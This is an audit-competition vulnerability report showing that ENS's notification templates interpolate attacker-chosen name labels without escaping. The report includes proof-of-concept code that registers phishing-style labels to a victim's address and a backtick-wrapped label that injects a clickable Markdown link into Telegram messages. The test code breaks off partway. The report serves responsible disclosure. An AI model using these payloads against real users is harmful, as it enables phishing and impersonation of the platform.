# 92283 w a insight notification templates interpolate an ens label with no escaping a third party can plant persistent text in another user s manager inbox with no interaction by that user and a&#x20;

**Submitted on Sep 8th 2026 at 18:36:32 UTC by @zhouchungong for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92283
* **Report Type:** Websites & Apps
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Injecting/modifying the static content on the target application without JavaScript (persistent), such as:
* HTML injection without JavaScript
* Replacing existing text with arbitrary text
* Arbitrary file uploads, etc.

## Description

## Brief/Intro

The api-worker's notification templates interpolate an ENS name into their output with no escaping. That name is not the platform's own copy — it is a string an attacker writes, on-chain, and can direct into any address's account without that address doing anything.

Two consequences follow:

1. **The victim's in-app notification inbox stores and renders attacker-authored text**, unsolicited and indefinitely. This half needs nothing from the victim: the row is written before any preference is consulted.
2. **On Telegram the same string becomes attacker-controlled markup** — this half additionally requires the victim to have a verified Telegram channel and `owned_name_expiry = true`, which is **not** the default; the in-app half in point 1 requires neither. The template places the name inside a Markdown code span and sends with `parse_mode: 'Markdown'`. A label carrying a *pair* of backticks closes that span and re-opens it, and everything between them is parsed as Markdown — so the message ENS's own template composes carries a clickable link of the attacker's choosing. We measured this by sending the template's own output through the Bot API on **our own throwaway bot**, never ENS's; see part 5.

The second is not "the app displayed a name you own". It is the platform's own delivery code turning untrusted input into markup because it never escapes it. Over `workers/api-worker/src/services` and `src/queues`, `grep -rn "ens_normalize|beautify|normalize|escapeMarkdown|MarkdownV2|escapeHtml|isValidName" --include=*.ts | grep -v test` returns 10 hits, every one of them about cursors, e-mail rate-limit keys or PostHog counters — **not one touches the name**.

What was and was not measured is set out in "Stated against ourselves". The one link we could not execute **at all** is the SendGrid template, because its body is not in the audited code; everything else in the chain is run somewhere below, and each leg says what was stubbed.

## Vulnerability Details

**1. The attacker writes the string, and chooses whose account it lands in.**

`register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer)` on the v2 registrar `0xa88553F454b77203B0D036A05c894d555EAAa2Cc` mints to `owner`, which need not be the sender. On an Anvil fork of Sepolia the attacker paid for and minted a name whose label was a 72-character attacker-written sentence to a victim address; the victim's registry balance went `0 → 1` while the victim's transaction nonce stayed `0 → 0`.

The registrar's price oracle accepts labels containing backtick, `*`, `[`, `]`, `(`, `)`, space, newline, `/`, `.`, U+202E, ZWNJ, ZWSP and soft hyphen. The length gate is measured in **codepoints, not bytes**: `out-b-charset.json` shows a one-codepoint four-byte label (an emoji) rejected with the length selector `0xdbfa2886`, as are one character and the empty string, while the smallest accepted labels are three codepoints. 255 accepted / 256 rejected are both ASCII, so that sweep cannot tell us whether the upper bound counts bytes or codepoints, and we do not claim which. 28 of 33 cases accepted; of the five rejections, `emoji`, `single`, `empty` and `long-256` are length, while `control-digits` reverts `0x477707e8` because our own earlier run had taken that label — it is not evidence about digits.

**2. The label reaches the app unaltered — measured on the fallback indexer host, because the production one was down.**

`workers/api-worker/src/services/expiry-discovery/indexer.ts:13-28` queries the indexer for `domains { name expiryDate owner { id } }` (the `name` selection is line 21). Its `where` clause is `{ expiry_gt: $cursor, expiry_lte: $upper_bound }` and nothing else — **there is no filter on the label, on normalisation, or on who the owner is**, so any name inside the expiry window is picked up whatever its label contains. `indexer.ts:134-142` lower-cases `owner.id` and passes `name` through untouched. A name registered on live Sepolia **to our own address** for this report came back as ``name: "r51probe`x.eth"`` with U+0060 intact, `labelName: "r51probe`x"`,` isNormalized: false\`.

**A caveat about reproducing that reading today, which we would rather state than have discovered.** That row was returned by `staging-graphql.ens.dev` on 2026-09-07 and the response is archived (`out-r-confirm.json`). Since then the production host `graphql.ens.dev` has returned 502 on every probe we kept, and the staging host has rolled back: its entire `isNormalized: false` listing is now 22 rows whose newest `createdAt` is **2026-08-20**, eighteen days before either of our registrations. We checked with a positive control — the very name quoted above, which this same host served us on 2026-09-07, is **also absent now**. So the relay reading is archived rather than currently reproducible, and that is a property of ENS's indexing infrastructure, not of the label.

**3. The app addresses the message to the victim on ownership alone.**

`workers/api-worker/src/queues/event-ingestion.ts:150` looks the event owners up with `inArray(TABLE.users.address, ownerAddresses)` and `:177-178` builds the owner-to-user map; `:75-105` (`collectRecipientsForEvent`) then consumes that map and marks the recipient `'owned'`. `event-ingestion.ts:223-233` builds `payload: { name: event.name, … }` verbatim, and `:249-262` writes the row to the `notifications` table — **before** the preference gate at `:341-349`. No step in `workers/api-worker/src/services` or `src/queues` normalises, validates or escapes the name.

**4. Four channels consume it.**

* `workers/api-worker/src/services/delivery/templates/telegram.ts:28-49`, sent at `services/delivery/telegram.ts:66-73` with `parseMode: 'Markdown'` (`templates/telegram.ts:39`). Quoted verbatim from the source (both branches are single-line template literals):

```ts
    const ownerText = payload.isOwner
      ? `Your domain \`${payload.name}\` will expire in *${daysLeft} days*.\n\nDon't forget to renew your domain!`
      : `The domain \`${payload.name}\` you're watching will expire in *${daysLeft} days*.`
```

A backtick in the label closes the code span; the remainder is parsed as Markdown.

* `workers/api-worker/src/services/delivery/templates/push.ts:22-39` — the raw label goes into `body`, `tag`, and `data.url`.
* `workers/api-worker/src/services/delivery/templates/email.ts:18-28` — the raw label is passed as SendGrid `dynamicData.name`.
* `apps/manager/src/features/notifications/inbox/notification-item.tsx` → `notifications/name-expiry.tsx` → `shared/templates.tsx` (`NameCardTemplate`) → `shared/primitives.tsx:82-90` (`NameDisplay`) — the raw label is rendered as the notification's name in the victim's inbox. The same `NotificationItem` is also mounted by the header dropdown (`dropdown/notification-dropdown.tsx:66`). The rendered card text is in Proof of Concept part 4.

**5. Nothing in Manager clears it, and the server would not honour it if something did.**

A "Remove notification" control does exist in the component library — `apps/manager/src/features/notifications/shared/primitives.tsx:68-77` renders an X button with `aria-label="Remove notification"` — but **it is rendered only when an `onRemove` handler is passed, and neither call site passes one**: `inbox/list.tsx:136-139` and `dropdown/notification-dropdown.tsx:66-71` both mount `NotificationItem` without it. The button therefore never appears. This is visible in the rendered DOM captured in Proof of Concept part 4: `out-r51-inbox-render.json`'s `s1_html` and `s2_html` contain no such button.

The worker does expose an archive endpoint — its doc-comment is at `app/routes/notifications/index.ts:265-267` — but it has no caller in the repository. And if it were called, it would not remove the row from the inbox:

* the listing the inbox reads is `index.ts:74-79`, and its whole `where` is `user_id` plus the pagination cursor:

```ts
        where: and(
          eq(TABLE.notifications.user_id, userId),
          // Cursor-based pagination: get notifications older than cursor
          // Note: If cursor is invalid UUID, this will return no results (graceful degradation)
          cursor ? lt(TABLE.notifications.id, cursor) : undefined,
        ),
```

* the projection at `index.ts:62-73` does not return `archived_at` at all, so no client could filter on it either;
* the unread-count read at `index.ts:155-165` looks only at `read_at`.

Full enumeration of `archived_at` in the worker: written at `:309` (personal) and in one upsert at `:330`/`:340` (broadcasts); read in exactly one place, `:316`, which is the archive update's own `isNull` guard against re-archiving; declared in the schema at `core/database/schema/notifications.ts:189,275`. **No listing query filters on it.**

Nor is the row dropped client-side: `apps/manager/src/features/notifications/data/selectors.ts:22-43` discards only unknown kinds and payloads that fail their schema, and `name-expiry`'s payload declares `name: v.string()` (`packages/shared-schema/src/notifications/kinds/name-expiry.ts:8`) — no character constraint, so the attacker's string parses. That package is out of scope as an asset; we cite it only to show what the in-scope consumer is handed. This is what supports *indefinitely* in the Brief, and **Proof of Concept part 7 executes it**: against a real PostgreSQL engine built from the repository's own migrations, the production consumer writes the row, `PATCH /notifications/archive` returns `200` and really does set `archived_at`, and the same listing then returns the same row again — while a control that deletes the row outright makes the listing return nothing.

**6. Why several different labels appear below, and what that costs us.** Each leg proves one link, and the links compose because the label's character set is not leg-specific: the registrar's acceptance of backticks, brackets, parentheses and spaces is established once by the read-only `getRegisterPrice` sweep in part 1; the indexer's verbatim relay in part 2; the discovery stage that feeds the queue in part 6; the templates' behaviour in parts 3, 4 and 5; persistence and non-removability in part 7.

**No single name has been carried from chain to inbox in one run, and we will not imply otherwise.** We tried to close it: after the first registration used a single backtick — which the templates relay fine but Telegram rejects for unbalanced entities — we registered a second name on live Sepolia carrying a **pair**, ``r51b`x`y.eth`` (register tx `0x873bc3bdd467e5b515714d9ed6b079b1984dbd3abf4a09d80cc14460236915f5`, block 11662417, token id in `out-n-sepolia-register.json`). The on-chain half is done and anyone can verify it. The next hop is where it stops: the indexer that would carry it into the pipeline is 502 on production and eighteen days stale on staging, as measured above. So the gap that remains is one hop wide, and we will describe the rest precisely rather than flatteringly: parts 3, 4, 6 and 7 are **four separate executed runs on the same label**, not one process carrying one object end to end. Each constructs its own input at its own entry point, and part 6 shows that the event the cron really produces is a superset of the one part 3 is given. What is missing between the on-chain name and those runs is the indexer hop, and it is missing because the indexer is down, not because we chose not to run it.

## Impact Details

**Claimed impact: `Injecting/modifying the static content on the target application without JavaScript (persistent)` (High).** The pipeline persists attacker-authored content into another user's account and renders it, with no action by that user. *Persistent* is measured, not asserted: part 7 writes the row through the production consumer, archives it through the production endpoint, and reads it back. The out-of-scope list excludes *reflected* plain text injection and states verbatim that this "does not exclude … **persistent plain text injection**".

We rely on the head clause — *injecting static content on the target application without JavaScript, persistent* — and not on the three `such as` examples, none of which we claim: we do not inject HTML, we do not replace existing text, and we upload no files. We read the examples as illustrative rather than as a substitute for the clause; if the program reads them as exhaustive, that is a fair reason to place us lower and we would rather have that said than assumed.

We would rather argue the classification openly than have it argued for us:

**"…on the target application."** The in-app notification inbox is the target application, and the row there is created unconditionally. That half is plain text, because React escapes it. The markup half — the part that is unambiguously an escaping defect rather than a display of data — is delivered on Telegram, i.e. off-application. **If a triager holds that the markup half therefore cannot count, what remains is the in-app persistent plain-text row, and we accept whatever band that merits.** We are not claiming HTML injection or XSS anywhere.

**What Telegram itself says.** The production template's own output for the label ``a`[Renew now](https://ens-verify.example/claim)`b`` — generated by calling the template, not transcribed — returns `"ok":true` with entities `bold` (the heading), `code`, **`text_link` → `https://ens-verify.example/claim`**, `code`, `bold`; the visible text collapses to `aRenew nowb.eth`, and Telegram attaches a link preview for the attacker's domain. The same template with a benign label returns `bold`, a single `code` spanning the whole name, and `bold` — **no `text_link`, and the name is not split**. Only the label differed.

**And the case that does not work, stated here rather than left in the appendix.** A label with a *single* backtick — which is what our **first** live-Sepolia registration used — makes the message's backtick count odd, and Telegram rejects the whole send with `400 … can't parse entities`. That is a delivery failure, not an injection. The markup result above needs a **pair** of backticks. We did mint a pair on Sepolia (the second registration, below), but the specific label carrying the markdown link was exercised on a fork and through the templates, not minted on chain. We say what this costs us in the self-limiting section below.

**Why not `Taking state-modifying authenticated actions … on behalf of other users without any interaction by that user` (Critical).** We read that impact narrowly — as acting *as* the victim, changing their registration information or their notification settings — and on that reading we do not qualify: we cause a row to be created *for* them rather than acting as them. The narrow reading is our own choice, not the program's stated one, and we are declining the higher band on it. We mention the impact only to say that we considered it and are not claiming it.

**"But the dashboard already shows any name you own."** True, and worth stating plainly: `apps/manager/src/features/dashboard/components/MyNamesList.tsx:333` renders `name={row.name}` for every owned name, so unsolicited ERC-1155 tokens already put attacker text on a victim's screen. That is a property of the token standard, and we are not reporting it. The difference is what the *notification* code does with the same string: it composes it into a message the platform authors and sends, in a channel where formatting is interpreted. A list that displays a name is not the same thing as a template that lets that name close a code span.

**The out-of-scope clause we think is aimed at this shape, and why we think it misses.** The list excludes `UX and UI impacts that do not materially disrupt use of the platform`. The natural reading is a presentation defect the user can undo. That is measurable, and section 5 above measures it: there is no clear, dismiss or archive control on the inbox at all, and the archive endpoint that does exist is not honoured by the listing. The attacker's text stays in the account with no user-reachable way to remove it. Relatedly, the clause excluding impacts that need `un-prompted, in-app user actions that are not part of the normal app workflows` does not apply either: the in-app half needs no action from the victim at all.

**The likeliest downgrade, named in advance.** A triager may reach for `Changing non-sensitive details of other users … such as: Enabling/disabling notifications` (Medium). We do not change any setting or preference. External delivery stays silent because `owned_name_expiry` is `false` by default — in part 7 the victim has no settings row at all and `event-ingestion.ts:342-343` falls back to `false` — and what lands is content, not a configuration change. But we would rather name that band ourselves than have it look unconsidered.

**This shape is already on chain, and not put there by us.** While checking the indexer we found ``renew`-SECURITY-NOTICE-from-ENS-message-@ensrenewals-to-keep-this-name-`x.eth`` — a **pair** of backticks wrapping text that impersonates ENS support — owned by `0xa3bfe86e5d412bbf14461ea5323f375a7c42f654`, `createdAt` **2026-08-18T14:47:36.000Z**. The same address registered ``re`new.eth`` two minutes later. We did not create these names, have never interacted with them, and read them only from the public indexer. We also cannot tell you what they are, and the most likely reading is not the most flattering one to us: registered about seven hours after this competition opened, they are quite possibly **another participant's proof of concept for this same finding**. We are raising that possibility ourselves rather than letting it be inferred. What they do establish is that a label of exactly this shape is registrable, is registered, and is sitting in the data the notification pipeline reads — so this is not a shape we had to invent.

**Not a contract or indexer bug.** The registrar's arbitrary-`owner` parameter and the indexer's verbatim relay are each correct for their layer, and both are out of scope as components. The defect is that in-scope code consumes their output as trusted presentation copy.

**Cost to the attacker:** one registration per victim, and the sweep says this is the **cheapest** band, not the dearest. `out-b-charset.json` prices by **codepoint count**, not by byte length: three-codepoint labels cost 49.095891 test USDC, four-codepoint labels 12.273974, and everything from five codepoints upward — a 40-byte label and a 255-byte label alike — costs **0.613701**. Attacker-written sentences are long, so they sit in that flat bottom band. The name we registered on Sepolia cost exactly that.

## Stated against ourselves

* **`templates/telegram.ts:44` also interpolates the raw label into the inline-keyboard button URL**, and we expected that to be the weak point: a rejected `sendMessage` (e.g. `BUTTON_URL_INVALID`) would have made the markup half worthless, and `queues/telegram.ts:44-45` retries on any error result, so the victim would simply never receive the notification. It is not the weak point — Telegram accepted the button, percent-encoding the space, and returned `"ok":true`. We record this because it was our own leading objection to this finding.
* **The e-mail channel: not measured, and not measurable by us.** `email.ts:18-28` hands the raw label to SendGrid as `dynamicData.name`, and the rendering happens in a dynamic template stored in ENS's SendGrid account (`d-fb5409b2…`, `wrangler.jsonc:109`). The template body is not in the audited code and never was: the id appears only in configuration, the repository has never tracked a `.hbs`/`.mustache`/`.handlebars` file and the worker source contains no Handlebars syntax at all. (We will not offer git history as evidence here: the published repository is three squashed commits and `--diff-filter=D` returns no deletions of any kind across all of it, so that check could not detect a removed template even if one had existed.) Retrieving it would require ENS's SendGrid API key, which we do not have and did not seek. What can be said from the audited code and SendGrid's documentation: the subject is a static string, and Handlebars escapes `{{name}}` by default — the docs say *"If you don't want Handlebars to escape a value, use the "triple-stash", {{{"*. So under the default this channel is a text-injection site at most. Two qualifications we will not paper over: a template written with `{{{name}}}` would not escape, and HTML escaping would not sanitise the label if the template places it inside an `href` — which is exactly what the Telegram and push templates do with the same string.
* **What is stubbed in each executed leg.** Part 6 runs the production `runExpiryDiscoveryCron` with the `indexer.js` module and the KV/queue bindings replaced; because the whole indexer module is replaced there, the mapping at `indexer.ts:134-142` is not exercised by part 6 — that leg is part 2, against live Sepolia. Part 4 renders the real inbox components with `@tanstack/react-router`'s `Link` stubbed, since that component tree expects a router the test does not provide. Part 7 runs the production consumer and route handlers against PGlite with only the database transport and the auth middleware replaced; PGlite lacks `pg_uuidv7`, so that extension is replaced by an equivalent SQL function and cursor pagination is not exercised. **No production database was touched**: every row above lives in an in-process engine created for the test.
* **The preconditions, stated together.** The victim must already be a Manager user: `collectRecipientsForEvent` matches the event's `owner` against a `users.address` row, so the in-app row is created only for an address that already has an account — we are not claiming the attacker can create accounts. Beyond that the in-app row requires nothing from the victim: no click, no transaction, no acceptance of the token. The external channels additionally require a verified channel and `owned_name_expiry = true`, which is **not** the default (`workers/api-worker/src/core/database/schema/notifications.ts:143`), so "zero interaction" is not uniform across the four sites.
* **The indexer, in one place.** `https://graphql.ens.dev/`, the worker's `DEFAULT_INDEXER_URL`, was unreachable on all 15 probes for which we kept output: 14 recorded an explicit `502` status code and the fifteenth kept the same Cloudflare 502 page without a recorded status (last re-probed 2026-09-08, `out-u-indexer-reprobe.txt`). The relay reading was therefore taken from `https://staging-graphql.ens.dev/`, the default/fallback host in `packages/indexer/urql/client.ts:28,36`; it serves the same schema, and we could not verify it applies the same normalisation policy. We then registered a second live name — ``r51b`x`y.eth``, a pair of backticks, neutral text, our own address (`out-n-sepolia-register.json`) — specifically to close the end-to-end gap, **and it did not close it**: the name is on chain but not in the indexer, and neither is the first name any more. Full state with the positive control in `out-e2e-indexer-state.json`. We are reporting the attempt and its failure rather than quietly keeping the earlier reading.
* **We looked for a way to suppress the victim's genuine notifications and did not find one.** `event-ingestion.ts:68-73` builds the idempotency key by joining the name with `:` and no escaping, but the stage and expiry are appended after the name, so we could not construct a collision.
* **`R2-04`** (known issue) is the closest thing in the list to us and we would rather raise it ourselves: the Explorer's OG-image worker resolves a name's **avatar text record** — attacker-controlled for any name they own — and fetches it server-side with no host or IP allowlist, an SSRF primitive. Both findings involve a worker handling a string an attacker can choose. The root causes are not the same, and the test we would apply is whether either fix touches the other:
  * **Different input.** R2-04's is a resolver text record the owner sets after registration. Ours is the label itself, fixed at registration and carried by the name.
  * **Different defect.** R2-04 is a missing **egress allowlist** on a server-side `fetch`. Ours is missing **output encoding** at string interpolation. Add the host/IP allowlist R2-04 asks for and the Telegram code span still closes and the inbox row still says whatever the attacker wrote; encode our name and R2-04's SSRF is untouched.
  * **Different code.** R2-04 is the Explorer's OG-image worker; ours is the api-worker's notification delivery templates and the Manager inbox. We accept that "a worker trusted an attacker-controlled name" can be stated at a level of generality that covers both. At that level it would also cover any future injection anywhere in `workers`, which we do not think is what the rule is for. If you read it that way, we would rather be told.
* **`R2-02`** (known issue) records that the Manager app ships no CSP, and its own last sentence draws the line we rely on: "Findings that depend only on the absence of CSP are covered here; an actual injection sink is a separate finding." Nothing we claim depends on the absence of CSP. We read all 59 known issues, not only the ones matching a keyword.
* **`EXP-INPUT-005`** (known issue) covers ENS name validators accepting inputs that normalisation rejects, causing homograph-style display confusion in the UI. The in-app half of this report is adjacent to it. What we report is not display confusion from a lookalike name but the absence of escaping in a message-composition template, plus a third party choosing whose account the string lands in. If you judge the two to be one issue, we would rather know than have it inferred.
* **`EXP-INPUT-009`**, quoted in full because its second sentence is about us: *"The push service worker opens a URL taken from notification data without validating its scheme or origin. Requires control of, or injection into, the notification payload."* We will not pretend that sentence is not there. Our position is that it describes a **different root cause**, and that the relationship runs one way:
  * 009's defect is in the **service worker's URL handling** — it opens a URL without validating scheme or origin. Ours is in the **api-worker's message templates** — they interpolate an untrusted string without encoding it. Different asset, different file, different fix: 009 is fixed by validating a URL at open time; ours is fixed by encoding the name at interpolation time, and doing only 009's fix would leave the Telegram markup and the in-app row exactly as they are.
  * 009 names payload injection as its **precondition**, not as its subject. A precondition being satisfiable is not the same defect as the thing it enables — otherwise every input-reaching-a-sink report would merge into the sink's own entry.
  * We **do** reach 009's sink, and will not pretend otherwise: `apps/manager/public/push-sw.js:63,76` passes `event.notification.data?.url` straight to `clients.openWindow`, and `templates/push.ts:34` builds that url as `https://app.ens.domains/${payload.name}` — the **path segment is entirely attacker-written**, and it is in our own artefact (`out-r51-notification.json`, `p3_push.data.url`). What we cannot control is the **scheme and the origin**, which are hardcoded, and those are exactly what 009 is about. So we supply the payload 009 names as its precondition, we reach its sink, and we still cannot do the thing 009 describes. **We claim nothing about the service worker's URL handling, and rely on the push channel for no impact at all.** If you nonetheless judge these one issue, we would rather be told than have it inferred.

## References

* SendGrid Handlebars documentation, for the escaping sentence quoted above: <https://www.twilio.com/docs/sendgrid/for-developers/sending-email/using-handlebars> (fetched 2026-09-08; the sentence is in the "Replacement with HTML" note)
* `workers/api-worker/src/services/expiry-discovery/indexer.ts:13-28` (`name` at :21), `:134-142`
* `workers/api-worker/src/queues/event-ingestion.ts:75-105`, `:223-233`, `:249-262`, `:341-349`
* `workers/api-worker/src/app/routes/notifications/index.ts:74-79` (listing `where`: no `archived_at` predicate), `:62-73` (projection: `archived_at` not returned), `:309` and the `:330`/`:340` upsert (the writes), `:316` (the only read)
* `workers/api-worker/src/services/expiry-discovery/index.ts` (`runExpiryDiscoveryCron`, executed in Proof of Concept part 6)
* `workers/api-worker/src/services/delivery/templates/telegram.ts:28-49`, `push.ts:22-39`, `email.ts:18-28`
* `workers/api-worker/src/services/delivery/telegram.ts:66-73`
* `apps/manager/src/features/notifications/inbox/notification-item.tsx`; `notifications/name-expiry.tsx`; `shared/templates.tsx`; `shared/primitives.tsx:82-90` (`NameDisplay`) and `:68-77` (the never-rendered Remove control); `inbox/list.tsx:136-139`; `dropdown/notification-dropdown.tsx:66-71`
* `apps/manager/public/push-sw.js:63,76` (the service-worker sink discussed under `EXP-INPUT-009`)
* Live Sepolia registrations, both to our own address: `0xb7b41143c52e1a1b9f77bc990d9d319b85d8f5a1b49c0833468a81a1bcae856d` (block 11655877, single backtick, used for the indexer test) and `0x873bc3bdd467e5b515714d9ed6b079b1984dbd3abf4a09d80cc14460236915f5` (block 11662417, pair of backticks)

## Suggested fix

The defect is missing output encoding, so the fix belongs at the render sites:

1. **Escape per channel before interpolation.** Markdown-escape the name for Telegram (or move to `MarkdownV2` with its required escaping), and percent-encode it before building the button URL and `data.url`.
2. **Make the escape unskippable rather than per-call-site.** `telegram.ts`, `push.ts` and `email.ts` each interpolate the same raw `payload.name` independently, so a fourth channel repeats the defect by default. Give the delivery layer a type that can only be produced by a channel-specific encoder — a `RenderedName` that a template cannot construct from a raw string — so a template physically cannot reach the unescaped label. We deliberately do **not** propose normalising or rejecting non-normalised names here: that is input validation, it is a different issue, and a fully normalised label still needs escaping in a Markdown context.
3. Consider not raising owner-expiry notifications for names the account never interacted with, which removes the unsolicited-delivery primitive entirely.

## Proof of Concept

## Proof of Concept

Every artefact named below is under `targets/ens/poc/r51-notification-payload-injection/`, and `README.md` there is the map — it also records which files are superseded and why. Files carrying a `READ_THIS_FIRST` key say in-place how they should and should not be read.

Seven parts. Parts 1 and 2 establish that the attacker can write the string and that the app reads it back verbatim; parts 3, 4, 6 and 7 run the application's own code on it; part 5 asks Telegram's Bot API directly.

***

### Part 1 — the attacker mints a name carrying their own text into a victim's address (Anvil fork of Sepolia)

```bash
anvil --fork-url https://sepolia.gateway.tenderly.co --port 8551 &
```

Then, with viem, as ATTACKER (paying), against registrar `0xa88553F454b77203B0D036A05c894d555EAAa2Cc`:

```js
const LABEL = 'ens support renew now at ens-verify1788799820 example or lose your names'
const DURATION = 28n * 24n * 60n * 60n
// the registrar pulls the fee, so the attacker approves it first
await send(ATTACKER, USDC, ERC20_ABI, 'approve', [REGISTRAR, maxUint256])
const commitment = await pub.readContract({ address: REGISTRAR, abi: REGISTRAR_ABI,
  functionName: 'makeCommitment',
  args: [LABEL, VICTIM.address, secret, zeroAddress, zeroAddress, DURATION, zeroHash] })
await send(ATTACKER, REGISTRAR, REGISTRAR_ABI, 'commit', [commitment])
await test.increaseTime({ seconds: 65 }); await test.mine({ blocks: 1 })
await send(ATTACKER, REGISTRAR, REGISTRAR_ABI, 'register',
  [LABEL, VICTIM.address, secret, zeroAddress, zeroAddress, DURATION, USDC, zeroHash])
```

Readings (`out-c-assign.json`; the expiry reading is `out-e-expiry.json`):

```json
{
  "label": "ens support renew now at ens-verify1788799820 example or lose your names",
  "c1_register": "success",
  "c1_payer": "0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A",
  "c3_victimBalanceBefore": "0",
  "c2_victimBalanceAfter": "1",
  "c2_attackerBalanceAfter": "0",
  "c4_victimNonceBefore": 0,
  "c4_victimNonceAfter": 0
}
```

and from the registry's `getState(tokenId)`: `expiry - now = 2419200` seconds (28 days).

> Reproduction note: use a victim address with no code. The commonly used throwaway keys `0x1111…` / `0x2222…` carry EIP-7702 delegations on live Sepolia; ERC-1155 safe-mint into a code-bearing address calls `onERC1155Received` and reverts, which looks exactly like "the registrar refuses third-party owners". It does not.

A read-only sweep of `getRegisterPrice` over fresh labels (`out-b-charset.json`, 28 accepted of 33) shows the accepted character set includes backtick, `*`, `[`, `]`, `(`, `)`, space, newline, `/`, `.`, U+202E, ZWNJ, ZWSP and soft hyphen. The length gate is in **codepoints**: a one-codepoint four-byte emoji is rejected with the length selector `0xdbfa2886`, as are one character and the empty string, and the smallest accepted labels are three codepoints. 255 is accepted and 256 rejected, but both of those labels are ASCII so that pair cannot separate bytes from codepoints and we do not claim which it counts. `:` is not in this file; it is measured in `out-b2-charset.json` (case `colon`, label `ab:cd`, a price is returned) — and in that second file only the positive rows are usable, since its `accepted: false` rows carry revert `0x477707e8`, already registered, from our own earlier run.

***

### Part 2 — the indexer relays the raw label into the exact field the worker reads (live Sepolia)

One name was registered on live Sepolia to our **own** address for this check: ``r51probe`x.eth``, register tx `0xb7b41143c52e1a1b9f77bc990d9d319b85d8f5a1b49c0833468a81a1bcae856d`, block 11655877, price 0.613701 USDC.

```bash
curl -s -X POST https://staging-graphql.ens.dev/ -H 'content-type: application/json' \
  --data-binary '{"query":"{ domains(first: 30, where: { isNormalized: false }) { name labelName normalizedName isNormalized createdAt expiryDate tokenId owner { id } } }"}'
```

Our row, verbatim (`out-r-confirm.json`, `hosts[staging].ourRow`):

```json
{
  "name": "r51probe`x.eth",
  "labelName": "r51probe`x",
  "normalizedName": null,
  "isNormalized": false,
  "createdAt": 1788805296,
  "expiryDate": 1791224496,
  "tokenId": "0xa3e22cfbc01e630361f6a5a182d22c4d624af2eb4821ba826a98edf700000000",
  "owner": { "id": "0x514d667ae4c25d1384c08d44d51c298e273c9b1f" }
}
```

Codepoints of the returned `name`: `U+72 U+35 U+31 U+70 U+72 U+6f U+62 U+65 U+60 U+78 U+2e U+65 U+74 U+68` — **U+60 survives**. The same query returns pre-existing rows of the same shape: `café.eth`, `the_james.eth`, `test/name.eth`, `vitalik_buterin.eth`.

`domains[].name` is exactly the field selected by `services/expiry-discovery/indexer.ts:21`, inside the query at `:13-28`.

One field in that artefact needs explaining before it is misread: `tokenIdMatches` is `false`. The two values are the same token — the indexer returns the id as hex, the registrar as decimal, and our check script compared them as strings. `0xa3e22cfbc01e630361f6a5a182d22c4d624af2eb4821ba826a98edf700000000` is `74126612219730668795597531842603327806917695766005593612270826790345328558080`. The `false` is our comparator, not a mismatch.

**Second registration, and the state of the indexer at submission time.** The label above carries a single backtick, which the templates relay but Telegram rejects (part 5, T3). To carry one name the whole way we registered a second on live Sepolia with a **pair**, ``r51b`x`y.eth`` — neutral text, no link, minted to our own address:

```
approve   0x61e4600af7dd64177e457f40f446e4611e7d9a3a526b8fa718326ada51e2eeff  block 11662408
commit    0x7a92cab76d9c3d46617c45daac44d4f3fa52e01fe13fd7b2c23f1f1c700b6e37  block 11662409
register  0x873bc3bdd467e5b515714d9ed6b079b1984dbd3abf4a09d80cc14460236915f5  block 11662417
price 0.613701 USDC   owner balance after: 1
```

It never reached the indexer. Rather than leave that as "we could not find it", we measured the host (`out-e2e-indexer-state.json`):

```
host                        https://staging-graphql.ens.dev/      HTTP 200
rows (isNormalized:false)   22
our second name present     false
POSITIVE CONTROL: r51probe`x.eth, which this host served us on 2026-09-07
                            present now: false
newest createdAt anywhere   2026-08-20T16:59:12.000Z
```

The control is the point: a name this same host returned to us the day before is gone, and nothing in the whole listing postdates 2026-08-20. This is index staleness, not a property of our labels — and with production returning 502 throughout, there is currently no indexer we can reach that is current enough to carry a fresh name into the pipeline.

Two rows in that same listing were **not registered by us** and are worth reading:

```
renew`-SECURITY-NOTICE-from-ENS-message-@ensrenewals-to-keep-this-name-`x.eth
    createdAt 2026-08-18T14:47:36.000Z   owner 0xa3bfe86e5d412bbf14461ea5323f375a7c42f654
re`new.eth
    createdAt 2026-08-18T14:49:48.000Z   owner 0xa3bfe86e5d412bbf14461ea5323f375a7c42f654
```

A pair of backticks wrapping text that impersonates ENS support. We did not create them, have not interacted with them, and cannot say whether they are another researcher's demonstration or something else. They are quoted only to show that this label shape exists in the data the pipeline reads without our having put it there.

***

### Part 3 — the worker's own code addresses it to the victim and renders it (4 passed)

This part begins from the `ExpiryEvent` that `expiry-discovery` emits. That stage is run separately in **part 6**, which shows the same event being produced by the production cron; the database insert is still read from source rather than executed (see "Stated against ourselves"). Everything below runs the worker's real modules.

Copy into `workers/api-worker/src/` and run:

```bash
pnpm exec vitest run --reporter=verbose --config vitest.poc.config.ts src/poc-r51-notification-injection.test.ts
# Test Files  1 passed (1)
#      Tests  4 passed (4)
```

The listing below is the test file with its header and inline comments removed for length; the file itself is archived verbatim as `poc-r51-notification-injection.test.ts`, and the run log as `out/out-vitest-workers.txt`.

Which of its assertions discriminate: **P1's unknown-owner control** — an owner with no user row yields no recipients — can fail if the code changes. P2's detector check exercises the test's own helper against fixed strings, so like the benign-label checks it cannot fail on a production change; we list it for completeness, not as a control. The benign-label checks in P2 and P3 cannot fail on their own — the attack label was never fed to them — so they are useful only as the second half of a pair with the attack case, and we do not present them as independent controls.

```ts
import { readFileSync, writeFileSync } from 'node:fs'
import { describe, expect, it } from 'vitest'
import { collectRecipientsForEvent } from '#queues/event-ingestion.js'
import { pushTemplates } from '#services/delivery/templates/push.js'
import { telegramTemplates } from '#services/delivery/templates/telegram.js'

const VICTIM_ADDRESS = '0x8a218F9C5F0b8854213225DA4D62628D4C92BEF4'
const VICTIM_USER_ID = 'victim-user-id'
const ATTACK_LABEL = 'a`[Renew now](https://ens-verify.example/claim)`b'
const ATTACK_NAME = `${ATTACK_LABEL}.eth`
const BENIGN_NAME = 'alice.eth'
const EXPIRY = Date.now() + 28 * 24 * 3600 * 1000
const out: Record<string, unknown> = { attackLabel: ATTACK_LABEL, attackName: ATTACK_NAME }

const codeSpans = (s: string) => Math.floor(s.split('`').length / 2)
const linkOutsideCode = (s: string) => {
  const parts = s.split('`')
  return parts.filter((_, i) => i % 2 === 0)
